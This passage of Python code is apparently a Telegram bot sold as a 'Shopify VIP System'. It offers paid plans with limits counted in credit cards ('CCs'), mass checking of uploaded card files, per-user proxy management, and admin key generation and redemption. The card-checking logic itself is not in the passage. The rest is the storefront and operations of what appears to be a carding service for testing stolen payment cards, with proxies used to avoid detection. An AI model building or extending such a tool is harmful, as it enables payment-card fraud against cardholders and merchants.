        admin_panel = f"\n\n╰ ⦗ {get_custom_emoji('vip', '👑')} ⦘ 𝘈𝘥𝘮𝘪𝘯 𝘗𝘢𝘯𝘦𝘭\n  ├ /gen [𝘱𝘭𝘢𝘯] [𝘲𝘵𝘺] ⇾ 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦 𝘒𝘦𝘺𝘴\n  ├ /validate [𝘬𝘦𝘺] ⇾ 𝘊𝘩𝘦𝘤𝘬 𝘒𝘦𝘺\n  ├ /users ⇾ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘚𝘵𝘢𝘵𝘶𝘴\n  ╰ /maint ⇾ 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦 𝘔𝘰𝘥𝘦"

    text = f"""⦗ {get_custom_emoji('speed', '⚡')} ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮

├ ⦗ {get_custom_emoji('card', '💳')} ⦘ 𝘊𝘩𝘦𝘤𝘬𝘪𝘯𝘨
│ ╰ 𝘚𝘦𝘯𝘥 𝘢 𝘧𝘪𝘭𝘦 𝘵𝘰 𝘢𝘶𝘵𝘰-𝘴𝘵𝘢𝘳𝘵 𝘔𝘢𝘴𝘴 𝘊𝘩𝘦𝘤𝘬

├ ⦗ {get_custom_emoji('bank', '⚙️')} ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘔𝘢𝘯𝘢𝘨𝘦𝘳
│ ├ /addpxy ⇾ 𝘈𝘥𝘥 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
│ ├ /proxy ⇾ 𝘝𝘪𝘦𝘸 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
│ ╰ /rmpxy ⇾ 𝘙𝘦𝘮𝘰𝘷𝘦 𝘗𝘳𝘰𝘹𝘪𝘦𝘴

{account_prefix} ⦗ {get_custom_emoji('user', '👤')} ⦘ 𝘈𝘤𝘤𝘰𝘶𝘯𝘵
  ├ /info ⇾ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘧𝘪𝘭𝘦
  ├ /redeem ⇾ 𝘙𝘦𝘥𝘦𝘦𝘮 𝘒𝘦𝘺
  ├ /fb ⇾ 𝘚𝘦𝘯𝘥 𝘍𝘦𝘦𝘥𝘣𝘢𝘤𝘬
  ╰ /plan ⇾ 𝘝𝘪𝘦𝘸 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯𝘴{admin_panel}

⦗ {get_custom_emoji('vip', '💎')} ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘭𝘢𝘯 ⇾ <code>{plan.title() if plan else 'Bronze'} ({limit} 𝘓𝘪𝘮𝘪𝘵)</code>"""
    kb = [[Button.inline("⦗ 💎 ⦘ 𝘝𝘪𝘦𝘸 𝘗𝘭𝘢𝘯𝘴", b"show_plans")], [Button.url("⦗ 📢 ⦘ 𝘊𝘩𝘢𝘯𝘯𝘦𝘭", JOIN_CHANNEL_LINK), Button.url("⦗ 💬 ⦘ 𝘎𝘳𝘰𝘶𝘱", JOIN_GROUP_LINK)]]
    await styled_edit(event, text, buttons=kb)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await is_maintenance(event): return
    if not await force_join_check(event): return
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    text = f"""⦗ {get_custom_emoji('user', '👤')} ⦘ 𝘗𝘳𝘰𝘧𝘪𝘭𝘦 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯

├ ⦗ 🆔 ⦘ 𝘐𝘋: <code>{event.sender_id}</code>
├ ⦗ {get_custom_emoji('approved', '⚡')} ⦘ 𝘚𝘵𝘢𝘵𝘶𝘴: <code>{'Active' if is_paid_plan(plan) else 'Free'}</code>
├ ⦗ {get_custom_emoji('vip', '💎')} ⦘ 𝘗𝘭𝘢𝘯: <code>{plan.title() if plan else 'Bronze'}</code>
╰ ⦗ {get_custom_emoji('card', '💳')} ⦘ 𝘓𝘪𝘮𝘪𝘵: <code>{limit} 𝘊𝘊𝘴</code>"""
    await styled_reply(event, text, use_gif=True)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if await is_maintenance(event): return
    if not await force_join_check(event): return
    cp = await get_user_plan(event.sender_id)
    plans_text = f"⦗ {get_custom_emoji('vip', '💎')} ⦘ 𝘝𝘐𝘗 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘗𝘭𝘢𝘯𝘴\n\n"
    for pid, pi in PLANS.items():
        plan_emoji = get_custom_emoji(f"plan_{pi['tier'].lower()}", pi['emoji'])
        plans_text += f"├ ⦗ {plan_emoji} ⦘ <code>{pi['name']}</code>\n"
        plans_text += f"│ ├ ⦗ {get_custom_emoji('time', '⏱')} ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n"
        plans_text += f"│ ├ ⦗ {get_custom_emoji('card', '💳')} ⦘ 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(pi['tier'])} 𝘊𝘊𝘴</code>\n"
        plans_text += f"│ ╰ ⦗ {get_custom_emoji('price', '💲')} ⦘ 𝘗𝘳𝘪𝘤𝘦: <code>{pi['price']}</code>\n│\n"
    plans_text += f"╰ ⦗ {get_custom_emoji('user', '👤')} ⦘ 𝘠𝘰𝘶𝘳 𝘊𝘶𝘳𝘳𝘦𝘯𝘵 𝘗𝘭𝘢𝘯 ⇾ <code>{cp.title() if cp else 'Bronze'}</code>"
    kb = [[Button.url("⦗ 👑 ⦘ 𝘊𝘰𝘯𝘵𝘢𝘤𝘵 𝘖𝘸𝘯𝘦𝘳 𝘛𝘰 𝘉𝘶𝘺", "https://t.me/Dddadddyttt")], [Button.inline("⦗ 🔙 ⦘ 𝘉𝘢𝘤𝘬", b"back_start")]]
    await styled_reply(event, plans_text, buttons=kb, use_gif=True)

@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_cb(event):
    if await is_maintenance(event): return
    cp = await get_user_plan(event.sender_id)
    plans_text = f"⦗ {get_custom_emoji('vip', '💎')} ⦘ 𝘝𝘐𝘗 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘗𝘭𝘢𝘯𝘴\n\n"
    for pid, pi in PLANS.items():
        plan_emoji = get_custom_emoji(f"plan_{pi['tier'].lower()}", pi['emoji'])
        plans_text += f"├ ⦗ {plan_emoji} ⦘ <code>{pi['name']}</code>\n"
        plans_text += f"│ ├ ⦗ {get_custom_emoji('time', '⏱')} ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n"
        plans_text += f"│ ├ ⦗ {get_custom_emoji('card', '💳')} ⦘ 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(pi['tier'])} 𝘊𝘊𝘴</code>\n"
        plans_text += f"│ ╰ ⦗ {get_custom_emoji('price', '💲')} ⦘ 𝘗𝘳𝘪𝘤𝘦: <code>{pi['price']}</code>\n│\n"
    plans_text += f"╰ ⦗ {get_custom_emoji('user', '👤')} ⦘ 𝘠𝘰𝘶𝘳 𝘊𝘶𝘳𝘳𝘦𝘯𝘵 𝘗𝘭𝘢𝘯 ⇾ <code>{cp.title() if cp else 'Bronze'}</code>"
    kb = [[Button.url("⦗ 👑 ⦘ 𝘊𝘰𝘯𝘵𝘢𝘤𝘵 𝘖𝘸𝘯𝘦𝘳 𝘛𝘰 𝘉𝘶𝘺", "https://t.me/Dddadddyttt")], [Button.inline("⦗ 🔙 ⦘ 𝘉𝘢𝘤𝘬", b"back_start")]]
    await styled_edit(event, plans_text, buttons=kb)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]fb(?:\s+(.*))?'))
async def feedback_cmd(event):
    if await is_maintenance(event): return
    if not await force_join_check(event): return
    uid = event.sender_id
    text = event.pattern_match.group(1)
    
    if not text and not event.is_reply and not getattr(event.message, 'media', None): 
        return await styled_reply(event, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘵𝘰 𝘴𝘦𝘯𝘥.", use_gif=True)
    
    admin = ADMIN_ID[0] if ADMIN_ID else None
    if admin:
        try:
            if event.is_reply:
                rm = await event.get_reply_message()
                await client_instance.forward_messages(admin, rm)
                if text:
                    await client_instance.send_message(admin, f"💬 <b>Note:</b> {text}\n📩 <b>From:</b> <code>{uid}</code>", parse_mode="html")
                else:
                    await client_instance.send_message(admin, f"📩 <b>Feedback From:</b> <code>{uid}</code>", parse_mode="html")
            else:
                await client_instance.forward_messages(admin, event.message)
                await client_instance.send_message(admin, f"📩 <b>Feedback From:</b> <code>{uid}</code>", parse_mode="html")
        except Exception:
            pass
            
    await styled_reply(event, f"⦗ ✨ ⦘ 𝘠𝘰𝘶𝘳 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘥𝘦𝘭𝘪𝘷𝘦𝘳𝘦𝘥 𝘵𝘰 𝘵𝘩𝘦 𝘖𝘸𝘯𝘦𝘳. 𝘛𝘩𝘢𝘯𝘬 𝘺𝘰𝘶!", use_gif=True)

@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    if await is_maintenance(event): return
    uid = event.sender_id
    if uid in ADMIN_ID: return await event.answer("✅ Admin Access", alert=True)
    if await is_user_joined(uid):
        await mark_user_joined(uid)
        await event.answer("✅ Verified!", alert=True)
        try: await event.delete()
        except Exception: pass
        await styled_send(event.chat_id, f"⦗ {get_custom_emoji('vip', '✨')} ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮\n╰ 𝘚𝘦𝘯𝘥 /start 𝘵𝘰 𝘷𝘪𝘦𝘸 𝘵𝘩𝘦 𝘮𝘦𝘯𝘶.", use_gif=True)
    else:
        await event.answer("❌ Not joined yet!", alert=True)

# ====================== PROXIES COMMANDS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
async def add_proxy_cmd(event):
    if await is_maintenance(event): return
    try:
        if not await force_join_check(event): return
        lines = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8") as f:
                        content = await f.read()
                        lines = content.split()
                    os.remove(fp)
                except Exception: pass
            elif rm.text:
                lines = rm.text.split()
        else:
            p = event.raw_text.split(maxsplit=1)
            if len(p) == 2:
                lines = p[1].split()
            else:
                return await styled_reply(event, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘵𝘩𝘦 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘤𝘰𝘳𝘳𝘦𝘤𝘵𝘭𝘺.", use_gif=True)
        
        if not lines: return await styled_reply(event, f"⦗ 💎 ⦘ 𝘕𝘰 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘧𝘰𝘶𝘯𝘥 𝘪𝘯 𝘺𝘰𝘶𝘳 𝘮𝘦𝘴𝘴𝘢𝘨𝘦.", use_gif=True)
        db_proxies = await get_all_user_proxies(event.sender_id)
        existing_urls = {p['proxy_url'] for p in db_proxies} if db_proxies else set()
        cc = len(existing_urls)
        if cc >= 100: return await styled_reply(event, f"⦗ {get_custom_emoji('error', '⚠️')} ⦘ 𝘓𝘪𝘮𝘪𝘵 100/100 𝘳𝘦𝘢𝘤𝘩𝘦𝘥.", use_gif=True)
        
        parsed = []
        for l in lines:
            px = parse_proxy_format(l)
            if px and px['proxy_url'] not in existing_urls:
                parsed.append(px)
                existing_urls.add(px['proxy_url'])
                
        if not parsed: return await styled_reply(event, f"⦗ 💎 ⦘ 𝘈𝘭𝘭 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘢𝘳𝘦 𝘢𝘭𝘳𝘦𝘢𝘥𝘺 𝘢𝘥𝘥𝘦𝘥 𝘰𝘳 𝘪𝘯𝘷𝘢𝘭𝘪𝘥.", use_gif=True)
        parsed = parsed[:100-cc]
        tm = await styled_reply(event, f"⦗ {get_custom_emoji('card', '⚙️')} ⦘ 𝘈𝘥𝘥𝘪𝘯𝘨...")
        added = 0
        for pd2 in parsed:
            await add_proxy_db(event.sender_id, pd2)
            added += 1
        await styled_edit(tm, f"⦗ {get_custom_emoji('approved', '✅')} ⦘ 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘈𝘥𝘥𝘦𝘥: <code>{added}</code> 𝘗𝘳𝘰𝘹𝘪𝘦𝘴")
    except Exception as e:
        await event.reply(f"⚠️ Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def view_proxies(event):
    if await is_maintenance(event): return
    try:
        if not await force_join_check(event): return
        proxies = await get_all_user_proxies(event.sender_id)
        if not proxies: return await styled_reply(event, f"⦗ 💎 ⦘ 𝘠𝘰𝘶 𝘥𝘰𝘯'𝘵 𝘩𝘢𝘷𝘦 𝘢𝘯𝘺 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘴𝘢𝘷𝘦𝘥.", use_gif=True)
        text = f"⦗ {get_custom_emoji('bank', '🛡️')} ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘹𝘪𝘦𝘴 ({len(proxies)}/100)\n\n"
        for i, p in enumerate(proxies[:30], 1):
            text += f"<code>{i}.</code> <code>{p['ip']}:{p['port']}</code>\n"
        if len(proxies) > 30: text += f"\n<i>+{len(proxies)-30} 𝘮𝘰𝘳𝘦...</i>"
        await styled_reply(event, text, use_gif=True)
    except Exception as e:
        await event.reply(f"⚠️ Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
async def remove_proxy_cmd(event):
    if await is_maintenance(event): return
    try:
        if not await force_join_check(event): return
        proxies = await get_all_user_proxies(event.sender_id)
        if not proxies: return await styled_reply(event, f"⦗ 💎 ⦘ 𝘕𝘰 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘵𝘰 𝘳𝘦𝘮𝘰𝘷𝘦.", use_gif=True)
        p = event.raw_text.split(maxsplit=1)
        if len(p) == 1: return await styled_reply(event, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘱𝘦𝘤𝘪𝘧𝘺 'all' 𝘰𝘳 𝘵𝘩𝘦 𝘱𝘳𝘰𝘹𝘺 𝘯𝘶𝘮𝘣𝘦𝘳.", use_gif=True)
        arg = p[1].strip().lower()
        if arg == 'all':
            c = await clear_all_proxies(event.sender_id)
            return await styled_reply(event, f"⦗ {get_custom_emoji('approved', '✅')} ⦘ 𝘊𝘭𝘦𝘢𝘳𝘦𝘥 <code>{c}</code> 𝘗𝘳𝘰𝘹𝘪𝘦𝘴 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺.", use_gif=True)
        try:
            idx = int(arg) - 1
            if 0 <= idx < len(proxies):
                rm = await remove_proxy_by_index(event.sender_id, idx)
                await styled_reply(event, f"⦗ {get_custom_emoji('approved', '✅')} ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘳𝘦𝘮𝘰𝘷𝘦𝘥.", use_gif=True)
            else:
                await styled_reply(event, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘱𝘳𝘰𝘹𝘺 𝘯𝘶𝘮𝘣𝘦𝘳.", use_gif=True)
        except Exception:
            await styled_reply(event, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘱𝘳𝘰𝘹𝘺 𝘯𝘶𝘮𝘣𝘦𝘳.", use_gif=True)
    except Exception as e:
        await event.reply(f"⚠️ Error: {e}")

# ====================== REDEEM KEY ENGINE ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]gen\s+(plan[1-4])(?:\s+(\d+))?'))
async def generate_keys_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    plan_key = event.pattern_match.group(1).lower()
    amount_str = event.pattern_match.group(2)
    amount = int(amount_str) if amount_str else 1
    
    if plan_key not in PLANS: 
        return await styled_reply(event, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘗𝘭𝘢𝘯. 𝘗𝘭𝘦𝘢𝘴𝘦 𝘶𝘴𝘦: plan1, plan2, plan3, plan4", use_gif=True)
        
    pi = PLANS[plan_key]
    keys_db = await load_keys()
    generated_codes = []
    
    for _ in range(amount):
        rand_str = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))
        code = f"𝘚𝘩𝘰𝘱𝘪𝘧𝘺-{rand_str[:5]}-{rand_str[5:]}"
        keys_db[code] = {"tier": pi["tier"], "days": pi["duration_days"], "used": False, "used_by": None, "generated_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        generated_codes.append(code)
        
    await save_keys(keys_db)
    
    plan_emoji = get_custom_emoji(f"plan_{pi['tier'].lower()}", pi['emoji'])
    text = f"⦗ {get_custom_emoji('approved', '✅')} ⦘ 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 <code>{amount}</code> 𝘒𝘦𝘺(𝘴)!\n\n"
    text += f"├ ⦗ {plan_emoji} ⦘ 𝘗𝘭𝘢𝘯: <code>{pi['name']}</code>\n"
    text += f"├ ⦗ {get_custom_emoji('time', '⏱')} ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n"
    text += f"╰ ⦗ {get_custom_emoji('card', '💳')} ⦘ 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(pi['tier'])} 𝘊𝘊𝘴</code>\n\n"
    
    for c in generated_codes:
        text += f"<code>{c}</code>\n"
    await styled_reply(event, text, use_gif=True)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem(?:\s+(.+))?'))
async def redeem_key_cmd(event):
    if await is_maintenance(event): return
    if not await force_join_check(event): return
    
    code = (event.pattern_match.group(1) or "").strip()
    if not code: return await styled_reply(event, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘺𝘰𝘶𝘳 𝘬𝘦𝘺: <code>/redeem [𝘒𝘦𝘺]</code>", use_gif=True)
    
    keys_db = await load_keys()
    uid = event.sender_id
    
    if code not in keys_db:
        return await styled_reply(event, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘒𝘦𝘺. 𝘗𝘭𝘦𝘢𝘴𝘦 𝘤𝘩𝘦𝘤𝘬 𝘢𝘯𝘥 𝘵𝘳𝘺 𝘢𝘨𝘢𝘪𝘯.", use_gif=True)
    
    kinfo = keys_db[code]
    if kinfo["used"]:
        return await styled_reply(event, f"⦗ 💎 ⦘ 𝘛𝘩𝘪𝘴 𝘒𝘦𝘺 𝘩𝘢𝘴 𝘢𝘭𝘳𝘦𝘢𝘥𝘺 𝘣𝘦𝘦𝘯 𝘳𝘦𝘥𝘦𝘦𝘮𝘦𝘥.", use_gif=True)
    
    tier = kinfo["tier"]
    days = kinfo["days"]
    
    await set_user_plan(uid, tier, days)
    keys_db[code]["used"] = True
    keys_db[code]["used_by"] = uid
    redeem_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    keys_db[code]["redeemed_at"] = redeem_time
    await save_keys(keys_db)
    
    expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    limit = get_cc_limit(tier)
    
    msg = f"""⦗ {get_custom_emoji('vip', '👑')} ⦘ 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘈𝘤𝘵𝘪𝘷𝘢𝘵𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺!

🎉 𝘊𝘰𝘯𝘨𝘳𝘢𝘵𝘶𝘭𝘢𝘵𝘪𝘰𝘯𝘴! 𝘠𝘰𝘶𝘳 𝘬𝘦𝘺 𝘸𝘢𝘴 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘳𝘦𝘥𝘦𝘦𝘮𝘦𝘥.

⦗ {get_custom_emoji('vip', '💎')} ⦘ 𝘗𝘭𝘢𝘯 𝘋𝘦𝘵𝘢𝘪𝘭𝘴 ⇾
├ ⦗ {get_custom_emoji('approved', '⚡')} ⦘ 𝘛𝘪𝘦𝘳: <code>{tier}</code>
├ ⦗ {get_custom_emoji('time', '⏱')} ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{days} 𝘋𝘢𝘺𝘴</code>
├ ⦗ {get_custom_emoji('card', '💳')} ⦘ 𝘔𝘢𝘴𝘴 𝘓𝘪𝘮𝘪𝘵: <code>{limit} 𝘊𝘊𝘴</code>
╰ ⦗ {get_custom_emoji('time', '⏱')} ⦘ 𝘌𝘹𝘱𝘪𝘳𝘦𝘴 𝘖𝘯: <code>{expiry_date}</code>

⦗ {get_custom_emoji('speed', '🚀')} ⦘ 𝘌𝘯𝘫𝘰𝘺 𝘶𝘭𝘵𝘳𝘢-𝘧𝘢𝘴𝘵 𝘤𝘩𝘦𝘤𝘬𝘪𝘯𝘨 𝘸𝘪𝘵𝘩 <code>{WORKERS}</code> 𝘞𝘰𝘳𝘬𝘦𝘳𝘴!"""
    await styled_reply(event, msg, use_gif=True)

    try:
        user = await client_instance.get_entity(uid)
        user_name = getattr(user, 'first_name', '') or getattr(user, 'username', '') or str(uid)
        admin_notification = f"""⦗ {get_custom_emoji('approved', '🔔')} ⦘ 𝘕𝘦𝘸 𝘒𝘦𝘺 𝘙𝘦𝘥𝘦𝘦𝘮𝘦𝘥!

├ ⦗ {get_custom_emoji('card', '🔑')} ⦘ 𝘒𝘦𝘺: <code>{code}</code>
├ ⦗ {get_custom_emoji('user', '👤')} ⦘ 𝘜𝘴𝘦𝘳: <a href="tg://user?id={uid}">{user_name}</a> (<code>{uid}</code>)
├ ⦗ {get_custom_emoji('vip', '💎')} ⦘ 𝘗𝘭𝘢𝘯: <code>{tier}</code>
├ ⦗ {get_custom_emoji('time', '⏱')} ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{days} 𝘋𝘢𝘺𝘴</code>
╰ ⦗ {get_custom_emoji('time', '⏳')} ⦘ 𝘛𝘪𝘮𝘦: <code>{redeem_time}</code>"""
        if ADMIN_ID:
            await styled_send(ADMIN_ID[0], admin_notification, use_gif=True)
    except Exception:
        pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]validate(?:\s+(.+))?'))
async def validate_key_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    code = (event.pattern_match.group(1) or "").strip()
    keys_db = await load_keys()
    
    if not code: return await styled_reply(event, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘵𝘩𝘦 𝘬𝘦𝘺: <code>/validate [𝘒𝘦𝘺]</code>", use_gif=True)
    if code not in keys_db: return await styled_reply(event, f"⦗ 💎 ⦘ 𝘒𝘦𝘺 𝘯𝘰𝘵 𝘧𝘰𝘶𝘯𝘥 𝘪𝘯 𝘥𝘢𝘵𝘢𝘣𝘢𝘴𝘦.", use_gif=True)
    
    kinfo = keys_db[code]
    tier = kinfo.get("tier", "Unknown")
    days = kinfo.get("days", 0)
    used = kinfo.get("used", False)
    used_by = kinfo.get("used_by", "None")
    gen_time = kinfo.get("generated_at", "Unknown")
    red_time = kinfo.get("redeemed_at", "Not yet")

    status_emoji = get_custom_emoji('error', '🔴') if used else get_custom_emoji('approved', '🟢')
    status_text = "𝘜𝘴𝘦𝘥" if used else "𝘈𝘤𝘵𝘪𝘷𝘦"
    
    msg = f"""⦗ {get_custom_emoji('vip', '🔑')} ⦘ 𝘒𝘦𝘺 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯

├ ⦗ {get_custom_emoji('card', '💳')} ⦘ 𝘒𝘦𝘺: <code>{code}</code>
├ ⦗ {status_emoji} ⦘ 𝘚𝘵𝘢𝘵𝘶𝘴: <code>{status_text}</code>
├ ⦗ {get_custom_emoji('vip', '💎')} ⦘ 𝘗𝘭𝘢𝘯 𝘛𝘪𝘦𝘳: <code>{tier}</code>
├ ⦗ {get_custom_emoji('time', '⏱')} ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{days} 𝘋𝘢𝘺𝘴</code>
├ ⦗ {get_custom_emoji('time', '⏳')} ⦘ 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥: <code>{gen_time}</code>"""

    if used:
        msg += f"\n\n⦗ {get_custom_emoji('user', '👤')} ⦘ 𝘙𝘦𝘥𝘦𝘦𝘮𝘦𝘥 𝘉𝘺: <code>{used_by}</code> <a href='tg://user?id={used_by}'>[𝘗𝘳𝘰𝘧𝘪𝘭𝘦]</a>"
        msg += f"\n╰ ⦗ {get_custom_emoji('time', '⏱')} ⦘ 𝘙𝘦𝘥𝘦𝘦𝘮 𝘛𝘪𝘮𝘦: <code>{red_time}</code>"
        
    await styled_reply(event, msg, use_gif=True)

# ====================== SYSTEM CONTROL (ADMIN PANEL) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]maint(?: (on|off))?'))
async def maint_cmd(event):
    global _MAINTENANCE_MODE
    if event.sender_id not in ADMIN_ID: return
    arg = event.pattern_match.group(1)
    if arg: _MAINTENANCE_MODE = (arg.lower() == 'on')
    else: _MAINTENANCE_MODE = not _MAINTENANCE_MODE
    if _MAINTENANCE_MODE: await styled_reply(event, f"⦗ 💎 ⦘ 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦 𝘔𝘰𝘥𝘦: 𝘖𝘕\n╰ 𝘈𝘭𝘭 𝘶𝘴𝘦𝘳𝘴 𝘢𝘳𝘦 𝘯𝘰𝘸 𝘣𝘭𝘰𝘤𝘬𝘦𝘥.", use_gif=True)
    else: await styled_reply(event, f"⦗ {get_custom_emoji('approved', '✅')} ⦘ 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦 𝘔𝘰𝘥𝘦: 𝘖𝘍𝘍\n╰ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘪𝘴 𝘰𝘯𝘭𝘪𝘯𝘦 𝘧𝘰𝘳 𝘢𝘭𝘭 𝘶𝘴𝘦𝘳𝘴.", use_gif=True)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]users?$'))
async def admin_users_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    active_uids = [str(u) for u, p in ACTIVE_MTXT_PROCESSES.items() if not p.get("stopped")]
    active_count = len(active_uids)
    total_seen = len(USER_LAST_REQ)
    text = f"""⦗ {get_custom_emoji('gateway', '🌐')} ⦘ 𝘎𝘭𝘰𝘣𝘢𝘭 𝘚𝘺𝘴𝘵𝘦𝘮 𝘚𝘵𝘢𝘵𝘶𝘴\n\n├ ⦗ {get_custom_emoji('speed', '⚡')} ⦘ 𝘈𝘤𝘵𝘪𝘷𝘦 𝘊𝘩𝘦𝘤𝘬𝘦𝘳𝘴 ⇾ <code>{active_count}</code>\n├ ⦗ {get_custom_emoji('user', '👥')} ⦘ 𝘛𝘰𝘵𝘢𝘭 𝘚𝘦𝘴𝘴𝘪𝘰𝘯 𝘜𝘴𝘦𝘳𝘴 ⇾ <code>{total_seen}</code>\n╰ ⦗ 🆔 ⦘ 𝘈𝘤𝘵𝘪𝘷𝘦 𝘐𝘋𝘴 ⇾ <code>{', '.join(active_uids) if active_uids else 'None'}</code>"""
    await styled_reply(event, text, use_gif=True)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]revoke\s+(\d+)'))
async def revoke_plan_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try: target_uid = int(event.pattern_match.group(1))
    except Exception: return await styled_reply(event, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘷𝘢𝘭𝘪𝘥 𝘐𝘋.", use_gif=True)
    await set_user_plan(target_uid, "Free", 0)
    proc = ACTIVE_MTXT_PROCESSES.get(target_uid)
    if proc:
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    admin_msg = f"⦗ 💎 ⦘ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘙𝘦𝘷𝘰𝘬𝘦𝘥\n├ ⦗ {get_custom_emoji('user', '👤')} ⦘ 𝘜𝘴𝘦𝘳 ⇾ <code>{target_uid}</code>\n╰ ⦗ {get_custom_emoji('approved', '⚡')} ⦘ 𝘚𝘵𝘢𝘵𝘶𝘴 ⇾ <code>𝘋𝘦𝘮𝘰𝘵𝘦𝘥 𝘵𝘰 𝘍𝘳𝘦𝘦</code>"
    await styled_reply(event, admin_msg, use_gif=True)
